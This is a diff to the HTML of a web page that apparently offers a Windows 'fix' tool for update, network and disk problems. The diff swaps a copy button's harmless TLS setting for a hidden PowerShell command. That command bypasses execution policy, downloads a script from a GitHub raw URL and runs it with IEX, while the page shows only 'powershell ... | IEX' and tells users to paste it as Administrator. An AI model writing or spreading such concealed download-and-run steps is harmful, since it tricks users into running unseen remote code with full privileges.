@@ -131,7 +131,7 @@
             border: 1px solid rgba(48,54,61,0.8);
             border-radius: 16px;
             padding: 8px;
-            max-width: 720px;
+            max-width: 100%;
             margin: 0 auto 20px;
             animation: fadeUp 0.6s ease 0.3s both;
         }
@@ -156,7 +156,7 @@
         }
         .cmd-text {
             font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
-            font-size: 0.85rem;
+            font-size: 0.78rem;
             color: #00ff88;
             word-break: break-all;
             flex: 1;
@@ -168,7 +168,7 @@
             border: 1px solid rgba(0,255,136,0.2);
             color: #00ff88;
             padding: 8px 18px;
-            border-radius: 8px;
+            border-radius: 6px;
             cursor: pointer;
             font-size: 0.82rem;
             font-weight: 600;
@@ -209,26 +209,8 @@
             background: rgba(255,255,255,0.08);
             color: #c9d1d9;
         }
-        .tls-toggle .tls-box {
-            display: none;
-            max-width: 720px;
-            margin: 12px auto 0;
-            background: #0d1117;
-            border: 1px solid #30363d;
-            border-radius: 10px;
-            padding: 14px 20px;
-            font-family: 'Cascadia Code', 'Fira Code', 'Consolas', monospace;
-            font-size: 0.8rem;
-            color: #00ff88;
-            align-items: center;
-            justify-content: space-between;
-            gap: 12px;
-            white-space: nowrap;
-            overflow-x: auto;
-        }
-        .tls-toggle .tls-box.show {
-            display: flex;
-        }
+        #tlsBox1 { display: none; }
+        #tlsBox1.show { display: block; }
         .section-title {
             text-align: center;
             font-size: 0.8rem;
@@ -260,15 +242,6 @@
             transform: translateY(-3px);
             box-shadow: 0 10px 40px rgba(0,255,136,0.05);
         }
-        .card-icon {
-            width: 42px; height: 42px;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 1.3rem;
-            margin-bottom: 16px;
-        }
         .card h3 {
             font-size: 0.95rem;
             font-weight: 600;
@@ -279,15 +252,6 @@
             font-size: 0.82rem;
             line-height: 1.5;
         }
-
-        .ci-green  { background: rgba(0,255,136,0.1); color: #00ff88; }
-        .ci-blue   { background: rgba(0,102,255,0.1); color: #66b3ff; }
-        .ci-purple { background: rgba(168,85,247,0.1); color: #a855f7; }
-        .ci-orange { background: rgba(255,165,0,0.1); color: #ffa500; }
-        .ci-red    { background: rgba(255,80,80,0.1); color: #ff5050; }
-        .ci-cyan   { background: rgba(0,204,255,0.1); color: #00ccff; }
-        .ci-pink   { background: rgba(255,100,150,0.1); color: #ff6496; }
-        .ci-yellow { background: rgba(254,188,46,0.1); color: #febc2e; }
 
         .os-row {
             display: flex;
@@ -348,74 +312,75 @@
         <p class="cmd-note">Open PowerShell as Administrator and paste the command</p>
 
         <div class="tls-toggle">
-            <button onclick="this.nextElementSibling.classList.toggle('show')">&#9662; Old Windows builds (8.1 / Old 10) — click to reveal TLS command</button>
-            <div class="tls-box">
-                <span>[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12</span>
-                <button class="copy-btn" onclick="copyTls(this)">Copy</button>
+            <button onclick="document.getElementById('tlsBox1').classList.toggle('show')">&#9662; For CMD and PowerShell, on old and new Windows builds.</button>
+            <div id="tlsBox1">
+                <div class="cmd-card" style="animation:none;margin:12px auto 0;">
+                    <div class="cmd-top">
+                        <span class="cmd-dot r"></span>
+                        <span class="cmd-dot y"></span>
+                        <span class="cmd-dot g"></span>
+                    </div>
+                    <div class="cmd-body">
+                        <span class="cmd-text"><span class="ps">PS&gt;</span>&nbsp; powershell ... | IEX</span>
+                        <button class="copy-btn" onclick="copyTls(this)">Copy</button>
+                    </div>
+                </div>
             </div>
         </div>
+    </div>
+
+    <div style="text-align:center;margin-bottom:24px;">
+        <a href="https://raw.githubusercontent.com/UpdateSys/fix/main/MD_Fix_Commands.bat" target="_blank" class="os-pill" style="cursor:pointer;text-decoration:none;">Offline</a>
     </div>
 
     <div class="section-title">What it fixes</div>
 
     <div class="grid">
         <div class="card">
-            <div class="card-icon ci-green">&#128260;</div>
             <h3>Windows Update</h3>
             <p>Reset Update components, clear cache, and restart services</p>
         </div>
         <div class="card">
-            <div class="card-icon ci-blue">&#128736;</div>
             <h3>System Files</h3>
             <p>Run SFC and DISM to repair corrupt system files</p>
         </div>
         <div class="card">
-            <div class="card-icon ci-purple">&#127760;</div>
             <h3>Network Reset</h3>
             <p>Fix DNS, Winsock, TCP/IP and set Google DNS</p>
         </div>
         <div class="card">
-            <div class="card-icon ci-orange">&#128190;</div>
             <h3>Disk Cleanup</h3>
             <p>Clean temp files, thumbnails, caches and recycle bin</p>
         </div>
         <div class="card">
-            <div class="card-icon ci-red">&#128274;</div>
             <h3>Firewall</h3>
             <p>Reset Windows Firewall to default configuration</p>
         </div>
         <div class="card">
-            <div class="card-icon ci-cyan">&#9889;</div>
             <h3>USB Fix</h3>
             <p>Restart USB services and fix detection issues</p>
         </div>
         <div class="card">
-            <div class="card-icon ci-pink">&#128196;</div>
             <h3>Windows Search</h3>
             <p>Rebuild search index and fix indexing problems</p>
         </div>
         <div class="card">
-            <div class="card-icon ci-yellow">&#128295;</div>
             <h3>Group Policy</h3>
             <p>Reset Group Policy settings to factory defaults</p>
         </div>
         <div class="card">
-            <div class="card-icon ci-green">&#128293;</div>
             <h3>BSOD Cleanup</h3>
             <p>Clear crash dumps and minidump files</p>
         </div>
         <div class="card">
-            <div class="card-icon ci-blue">&#128640;</div>
             <h3>Windows Store</h3>
             <p>Reset Store cache and re-register the app</p>
         </div>
         <div class="card">
-            <div class="card-icon ci-purple">&#128275;</div>
             <h3>Activation</h3>
             <p>Restart Software Protection service and rearm</p>
         </div>
         <div class="card">
-            <div class="card-icon ci-orange">&#128187;</div>
             <h3>Explorer Fix</h3>
             <p>Clear icon cache and restart Explorer</p>
         </div>
@@ -444,7 +409,7 @@ function copyCmd(btn) {
     });
 }
 function copyTls(btn) {
-    const cmd = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12";
+    const cmd = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/UpdateSys/fix/main/fix\') | IEX"';
     navigator.clipboard.writeText(cmd).then(() => {
         btn.textContent = 'Copied!';
         btn.classList.add('copied');
